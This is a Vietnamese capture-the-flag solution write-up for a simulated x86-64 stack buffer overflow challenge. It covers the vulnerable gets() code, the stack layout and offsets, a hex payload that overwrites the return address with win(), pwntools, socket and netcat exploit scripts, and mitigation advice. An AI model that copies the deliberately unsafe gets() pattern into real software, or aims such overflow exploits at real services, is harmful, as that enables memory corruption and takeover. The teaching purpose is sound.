# Thử thách 24: StackSmash — Giải pháp

## Loại lỗ hổng
**Stack-based Buffer Overflow (Tràn bộ đệm trên ngăn xếp - Mô phỏng x86-64)**

## Mô tả
Thử thách này mô phỏng lỗi tràn bộ đệm kinh điển gây ra bởi việc sử dụng hàm `gets()`. Hàm xử lý dễ bị tổn thương đã sao chép thẳng dữ liệu do người dùng nhập vào một bộ đệm (buffer) rộng 32-byte mà không kiểm tra giới hạn độ dài (bounds check). Nếu Payload đủ dài, nó sẽ ghi đè lên con trỏ RBP đã lưu trên Stack (8 byte) và tiếp tục tràn để ghi đè lên địa chỉ trả về (Return Address) (8 byte) trên ngăn xếp mô phỏng. Việc kiểm soát Return Address trỏ về hàm `win()` sẽ giúp ta kích hoạt lấy Flag.

## Mã nguồn chứa lỗ hổng

```python
# chall.py — vuln()
data = bytes.fromhex(raw)   # Nhận input vô tội vạ, không giới hạn độ dài!

# Mô phỏng cấu trúc Stack: [buffer(32)] [saved_rbp(8)] [ret_addr(8)]
# Địa chỉ trả về bị trích xuất ở offset 40
ret_bytes = data[40:48]
ret_addr  = struct.unpack("<Q", ret_bytes)[0]

if ret_addr == WIN_ADDR:    # Kiểm tra xem có trỏ về 0xdeadbeefcafe không
    win()
```

Mã C tương đương trong thực tế:

```c
void vuln() {
    char buf[32];
    gets(buf);          // Không giới hạn số ký tự đọc — Tràn bộ đệm cổ điển
    return;             // Lúc return thì return address đã bị ghi đè!
}
```

## Bố cục bộ nhớ (Memory Layout)

```text
Low address
  ┌──────────────────────────┐
  │  buffer       (32 bytes) │  ← offset 0x00
  ├──────────────────────────┤
  │  saved RBP    (8 bytes)  │  ← offset 0x20  (Nhồi rác gì cũng được)
  ├──────────────────────────┤
  │  return addr  (8 bytes)  │  ← offset 0x28  (Ghi đè bằng WIN_ADDR)
  └──────────────────────────┘
High address
```

## Các bước khai thác (Exploit)

**Bước 1** — Xác định địa chỉ đích từ output của chương trình:
```text
[i] win()   @ 0xdeadbeefcafe
```

**Bước 2** — Tính toán khoảng cách Offset để tràn:
- Cần 32 bytes để lấp đầy Buffer.
- Cần 8 bytes để ghi đè Saved RBP (giá trị rác tùy ý).
- Cần 8 bytes ở offset 40 để ghi đè địa chỉ đích (WIN_ADDR định dạng little-endian).

**Bước 3** — Xây dựng tải trọng (Payload):
```python
payload = b"A" * 40 + struct.pack("<Q", 0xdeadbeefcafe)
```

Ở dạng Hexadecimal:
```text
41414141414141414141414141414141  (16 bytes)
41414141414141414141414141414141  (16 bytes)
4141414141414141                  (8 bytes ghi đè RBP)
fecaefbeadde0000                  (8 bytes WIN_ADDR dạng little-endian)
```

Chuỗi Hex liền mạch: 
`41414141414141414141414141414141414141414141414141414141414141414141414141414141fecaefbeadde0000`

## Khai thác tự động bằng Script (pwntools)

```python
import struct
from pwn import *

TARGET_HOST = "<host>"
TARGET_PORT = 1337

WIN_ADDR = 0xdeadbeefcafe

# Xây dựng tải trọng
padding  = b"A" * 40          # Lấp đầy buffer (32) + saved RBP (8)
ret_addr = struct.pack("<Q", WIN_ADDR)
payload  = padding + ret_addr

print(f"[*] Payload ({len(payload)} bytes): {payload.hex()}")

# Gửi Payload qua TCP
r = remote(TARGET_HOST, TARGET_PORT)
r.recvuntil(b"payload (hex):")
r.sendline(payload.hex().encode())
print(r.recvall(timeout=3).decode())
```

### Script dùng Python thuần (Không cần pwntools)

```python
import socket, struct

HOST = "<host>"
PORT = 1337
WIN_ADDR = 0xdeadbeefcafe

payload = b"A" * 40 + struct.pack("<Q", WIN_ADDR)

with socket.create_connection((HOST, PORT)) as sock:
    data = b""
    while b"payload (hex):" not in data:
        data += sock.recv(4096)
    print(data.decode())
    sock.sendall(payload.hex().encode() + b"\n")
    print(sock.recv(4096).decode())
```

### Sử dụng Bash + nc (Netcat)

```bash
python3 -c "
import struct
padding  = b'A' * 40
ret_addr = struct.pack('<Q', 0xdeadbeefcafe)
print((padding + ret_addr).hex())
" | nc <host> 1337
```

## Giải thích quy trình (Từng bước)

```text
1. Chương trình in ra địa chỉ:
     [i] win()   @ 0xdeadbeefcafe
     Buffer size: 32 bytes

2. Cần phải nhồi rác tới offset 40 (32 byte đệm + 8 byte rbp) trước khi chèn tiếp 8 byte địa chỉ mục tiêu.

3. Địa chỉ 0xdeadbeefcafe biểu diễn dưới dạng little-endian 8 bytes là:
     fe ca ef be ad de 00 00

4. Chuỗi Hex hoàn chỉnh cho Payload (48 bytes):
     4141...41 (40 ký tự 0x41) + fecaefbeadde0000

5. Server cắt trích xuất chuỗi bytes[40:48] → nhận được 0xdeadbeefcafe → gọi hàm win() → nhả FLAG.
```

## Biện pháp phòng ngừa (Mitigation)

```c
// 1. Sử dụng các hàm xử lý chuỗi có giới hạn an toàn (size-bounded)
fgets(buf, sizeof(buf), stdin);   // An toàn: chỉ đọc tối đa sizeof(buf)-1 ký tự

// 2. Biên dịch với chế độ bảo vệ ngăn xếp Stack Canary (-fstack-protector-strong)
// 3. Bật tính năng ASLR (Address Space Layout Randomization) tại cấp hệ điều hành
// 4. Kích hoạt cờ NX (No-Execute bit) trên bộ nhớ ngăn xếp
// 5. Nên ưu tiên viết bằng các ngôn ngữ an toàn bộ nhớ (Memory-Safe) như Rust, Go
```

## Các khái niệm liên quan

| Khái niệm | Giải thích |
|---|---|
| Tràn bộ đệm (Buffer Overflow) | Ghi đè bộ nhớ vượt quá kích thước được cấp phát của Buffer |
| Stack layout | Buffer → Saved RBP → Return Address (Trên kiến trúc x86-64) |
| Little-endian | Cách x86-64 lưu trữ số nhiều byte (byte nhỏ nhất LSB đứng trước) |
| Chiếm quyền điều khiển RIP | Kỹ thuật ghi đè Return Address để chuyển hướng luồng thực thi của chương trình |
| Hàm `win()` | Cấu trúc quen thuộc trong các bài thi CTF mảng Pwn: Cố gắng nhảy tới một hàm giấu kín để in ra cờ |
